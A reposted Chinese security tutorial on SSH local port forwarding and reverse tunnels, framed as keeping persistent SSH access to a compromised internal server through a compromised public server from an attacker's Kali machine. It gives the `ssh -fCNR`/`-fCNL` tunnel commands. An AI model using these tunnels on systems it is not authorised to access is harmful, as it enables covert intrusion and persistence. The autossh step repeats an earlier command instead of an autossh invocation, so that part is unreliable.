> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494972&idx=1&sn=0e309e74481b64577b87c3802d75858c&chksm=fc7be9e1cb0c60f71eb23300f692cea9936327254e285851fb7f6ee9fcd57debef711d69766b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFiaP3dCW5gZgZBqrbEozrPZK5I8Pmtjy6f0iaVLLpvWIdqLTwHIc5UJTzmdib1a1XmwEUhyI3QFXj81Q/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MzI1NjYyNTcxOQ==&mid=2247484052&idx=1&sn=61a00b6cef90b191d516bce635e528f2&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFhLz1H5qAkgh9wkAnWtKQNJd5gpJXE7XFR5qAuM2JpmdfLVUoDkug3r0BJF0TiaMK5vyiaYCEzwqeag/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490017&idx=1&sn=426336dfeeda818b0772b3c44703e173&chksm=fc781d3ccb0f942a7c07662752bb2f6983eb9c249c0d6b833f058b1d95fc7080d2d2598054ac&scene=21#wechat_redirect)

本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安世加的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

**欢迎各位添加微信号：asj-jacky**

**加入安世加 交流群 和大佬们一起交流安全技术**

使用 SSH 做端口转发以及反向隧道

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC7ZaMrYWalOBlgbe0Ct7tTCpgA1OdgXLIYehib9kxCrZLVrOHu4CnZx70OJlwTS5KdHHicGZaK2PC1A/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

目录

    SSH 做本地端口转发

    SSH 做反向隧道 (远程端口转发)

    用 autossh 建立稳定隧道

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

SSH 开启端口转发需要修改 /etc/ssh/sshd_config 配置文件，将 GatewayPorts 修改为 yes

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWx6pRiccCp2OJmKwOFZZnSXvcH8swCKCaGdL6ts2sgEKiaqYvArgF3zRg/640?wx_fmt=png)

```
-f 后台执行ssh指令
-C 允许压缩数据
-N 不执行远程指令
-R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口
-L 本地端口转发
-D 动态端口转发
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

►SSH 做本地端口转发

现在我们有这样一种情景，服务器 A 上有 Redis 数据库，并且我们知道 Redis 数据库的密码。但是 Redis 数据库只监听本地的 6379 端口，也就是 127.0.0.1:6379，现在我们需要连接该 Redis 数据库，读取其中的数据。那么，我们就可以用 SSH 做本地端口转发，在服务器 A 上监听 16379 端口，当连接该主机的 16379 端口时，16379 端口相当于正向代理，将我们的流量给本地的 6379 端口，再将 6379 端口返回的流量给我们的主机

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWw8AYBl5QY7sHIBnRvLEjE0gWUTSuFWumkIJXrnSAbReZgIJiaGhxSqg/640?wx_fmt=png)

```
ssh -fCNL *:16379:localhost:6379 localhost  #本地监听16379端口，将16379端口的流量都转发给6379端口
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

►SSH 做反向隧道 (远程端口转发)

> 注意：这里公网服务器 B 和内网服务器 A 都必须是 Linux 系统，才能建立 SSH 隧道

现在我们有这么一个环境，我们拿到了公网服务器 B 的权限，并通过公网服务器 B 进一步内网渗透，拿到了内网服务器 A 的权限。但是现在我们想要在自己的 Kali 机器上，获取内网服务器 A 的一个稳定持久的 SSH 权限。那么，我们可以通过 SSH 反向隧道，来得到内网服务器 A 的一个 SSH 权限。我们可以将内网服务器 A 的 22 端口远程转发到公网服务器的 1234 端口。

通俗地说，就是在机器 A 上做到 B 机器的反向代理；然后在 B 机器上做正向代理实现远程端口的转发

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWPfp53yKYYibTzmbicACqxOqzMhG2lLJBRRnrLpUgTwia2KjgwicopjIibLg/640?wx_fmt=png)

首先，在内网服务器 A 的操作

```
反向代理
ssh -fCNR  192.168.10.139:8888:localhost:22  root@192.168.10.139  #意思就是将A机器的22号端口的流量都转发给B机器的8888端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWbaYENw9s8eAC4anjJJZ7PRAJPAjYj9icqhGic9szBweEtoIzIVHdWicmQ/640?wx_fmt=png)

然后，公网服务器 B 的操作

```
正向代理
ssh -fCNL  *:1234:localhost:8888 localhost  #意思就是将本地监听的1234端口的流量都转发给本地的8888端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWEtKU7Cl3nniaUCcn3yrULjgX20slaPrBHHuwnbCYv5hRlTiaMPMhGcSA/640?wx_fmt=png)

接着，在黑客机器 C 的操作，通过 ssh 公网服务器 B 的某个端口实现 ssh 内网服务器 A 的 22 号端口

```
ssh -p 1234 root@100.100.10.12   #ssh连接到公网服务器的1234端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWjty9eHfzJqiaTXAN9CPu7KJZr4wh4icmtyFSVaRDUCU8UruplPWRpFIA/640?wx_fmt=png)

**所以最终流量的走向是这样的**：黑客 SSH 到公网服务器 B 的 1234 端口，公网服务器 B 监听了本地的 1234 端口，将流量转发到本地的 8888 端口，于是内网服务器 A 将本地的 22 号端口反向代理到了公网服务器 B 的 8888 端口，公网服务器 B 又将 8888 端口的流量转发到了本地的 1234 端口，所以黑客 SSH 连接到了内网服务器 A。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWwFhrI6vuZ7IPfnRMD8RHicLBnqD58zeN9SnnnXjzzM54Ol9AHjsucFQ/640?wx_fmt=png)

**缺点**：这种 ssh 反向链接会因为超时而关闭，如果关闭了那从外网连通内网的通道就无法维持了，为此我们需要另外的方法来提供稳定的 ssh 反向代理隧道。

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

►**用 autossh 建立稳定隧道**

安装 autossh：yum install autossh

autossh 的参数与 ssh 的参数是一致的，但是不同的是，在隧道断开的时候，autossh 会自动重新连接而 ssh 不会。另外不同的是我们需要指出的 - M 参数，这个参数指定一个端口，这个端口是外网的 B 机器用来接收内网 A 机器的信息，如果隧道不正常而返回给 A 机器让他实现重新连接。  
在内网 A 机器上的操作：

```
ssh -p 1234 root@100.100.10.12   #ssh连接到公网服务器的1234端口
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

参考文章：实战 SSH 端口转发

             使用 SSH 反向隧道进行内网穿透

相关文章：[内网渗透（七） | 内网转发及隐蔽隧道：网络层隧道技术之 ICMP 隧道 (pingTunnel/IcmpTunnel)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489736&idx=2&sn=0cb551ee520860878c2c33108033c00c&chksm=fc781c15cb0f9503f672aa0bd18cb13fef4c60124ba5978ab947c34272b2d8a28c584a99219d&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3okNXQklxyEOGf8O3njpw5lFv6KLyVZUpxezEuQlEOx5yxwTiactyPeibXCnfficWSJMAI0EqtH0mjufA/640?wx_fmt=png)

  

责编：vivian

来源：谢公子博客

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC7WOvqJzrYxANSsSsXWREZchRBtP5gkcf6bN5E5UBvXETXC8jruzBDAGbf6J44SuwUD2A7icJngOfA/640?wx_fmt=png)

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFjWI9QibTmpF13L33cHIh2bSMLAI4tW7sTgTkzh4lRcZ6JR7SrOibCTYUEsg8ZsmyKnUBm7h4J5klZw/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MzA3NzM2MjAzMg==&mid=2657228904&idx=1&sn=aa0d7a52864f19cbd6245a46ce162a1f&scene=21#wechat_redirect)

[内网渗透（十六） | 域分析工具 BloodHound 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494062&idx=1&sn=0c486f53daca08ee61abc51926db2b96&chksm=fc7bed73cb0c646557767e2e21d3c0113df80f831263dea4ce45bd6969da44f27ee700518427&scene=21#wechat_redirect)  

[内网渗透 | 红蓝对抗：Windows 利用 WinRM 实现端口复用打造隐蔽后门](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493916&idx=2&sn=eacc42e5f8f68fc65dae1c8a1201f014&chksm=fc7bedc1cb0c64d7115c0c3bf84410e29102a25627891c9eb85cba2026b7bc3622a9ebb5e2b2&scene=21#wechat_redirect)  

[内网渗透（十五） | psexec 工具使用浅析 (admin$)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493004&idx=1&sn=e908ac6ef03c0b5ae0cc5a2cabba7ebb&chksm=fc7be151cb0c684789bbc5f6a54e5906a3fed929eeffdba7667839491826fbb029bba295ef82&scene=21#wechat_redirect)  

[内网渗透（十四） | 工具的使用 | Impacket 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492731&idx=1&sn=570c1d9e12ef39709e289b5cc9e2447f&chksm=fc7be0a6cb0c69b0d94c41408b862214beaa631b04ba32f2307819a8b3ac445726849cb24e7f&scene=21#wechat_redirect)

[内网渗透（十三） | WinRM 远程管理工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492427&idx=1&sn=af3a862d78184e93b6e9377f12bce354&chksm=fc7be796cb0c6e80a057dff2a7d67e3483c33e8da2d3a7acb84d04fdd997f28cb89f1fd617fd&scene=21#wechat_redirect)  

[内网渗透（十二） | 利用委派打造隐蔽后门 (权限维持)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247491363&idx=1&sn=e5d6670b0f76299d92110d7b679ad70b&chksm=fc781bfecb0f92e8aacaa6f4f7788ed48577e25f943d92073b1b26e68bfbc8f505b2dd2fa4d8&scene=21#wechat_redirect)  

[内网渗透（十一） | 哈希传递攻击 (Pass-the-Hash,PtH)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490908&idx=1&sn=97594fbbef40346d07b5a6e5185ce77e&chksm=fc781981cb0f9097d18f4b32ff39f59b3512cedd35f0810ad5f61b661e631153f8c4e157d875&scene=21#wechat_redirect)  

[技术干货 | 工具：Social engineering tookit 钓鱼网站](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490513&idx=2&sn=10afb29a20f37df05ebb12ea4d540e1f&chksm=fc781f0ccb0f961a85e646dd54e977dbcaeb5569be6701db4c29b9e204d964bab3ded6bf1999&scene=21#wechat_redirect)

[技术干货 | 工具的使用：CobaltStrike 上线 Linux 主机 (CrossC2)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490608&idx=1&sn=f2b2ea93b109447aa8cc2c872aa87c52&chksm=fc7818edcb0f91fbf85fa53f71e9967fc29fc93f6a783eed154707ca2dec24ca7f419fde5705&scene=21#wechat_redirect)

[内网渗透（十） | 票据传递攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490376&idx=2&sn=c070dd4c761b49d3fabd573cc9c96b5a&chksm=fc781f95cb0f9683b0f6c64f5db5823973c1b10e87b1452192bbed6c1159eccf6e8f2fd0290b&scene=21#wechat_redirect)  

[内网渗透（九） | Windows 域的管理](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490197&idx=1&sn=4682065ddcab00b584918bc267e33f53&chksm=fc781e48cb0f975eddc44d77698fbb466d0eac7d745a6e5bbaf131560b3d4f9e22c1a359d241&scene=21#wechat_redirect)  

[内网渗透（八） | 内网转发工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490042&idx=1&sn=136d4057044a7d6f6cb5b57d20f7954a&chksm=fc781d27cb0f9431ec590662ab4e6bcd31b303e7caa20a2b116fd9a9b97e9e3be0bc34408490&scene=21#wechat_redirect)  

[内网渗透 | 域内用户枚举和密码喷洒攻击 (Password Spraying)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489985&idx=1&sn=0b7bce093e501b9817f263c24e0ed5b8&chksm=fc781d1ccb0f940aad0c9b2b06b68c7a58b0b4c513fe45f7da6e6438cac76d4778e61122faf8&scene=21#wechat_redirect)  

[内网渗透（七） | 内网转发及隐蔽隧道：网络层隧道技术之 ICMP 隧道 (pingTunnel/IcmpTunnel)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489736&idx=2&sn=0cb551ee520860878c2c33108033c00c&chksm=fc781c15cb0f9503f672aa0bd18cb13fef4c60124ba5978ab947c34272b2d8a28c584a99219d&scene=21#wechat_redirect)  

[内网渗透（六） | 工作组和域的区别](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489205&idx=1&sn=24f9a2e0e6b92a167f3082bb6e09c734&chksm=fc781268cb0f9b7e3c11d19a9fb41567124055eb0e8dd526cbbaf1e9393ff707f9fa9d10c32b&scene=21#wechat_redirect)  

[内网渗透（五） | AS-REP Roasting 攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect)

[内网渗透 | 内网穿透工具 FRP 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489057&idx=3&sn=f81ef113f1f136c2289c8bca24c5deb1&chksm=fc7812fccb0f9beaa65e5e9cf40cf9797d207627ae30cb8c7d42d8c12a2cb0765700860dab84&scene=21#wechat_redirect)  

[内网渗透（四） | 域渗透之 Kerberoast 攻击_Python](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)  

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)  

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)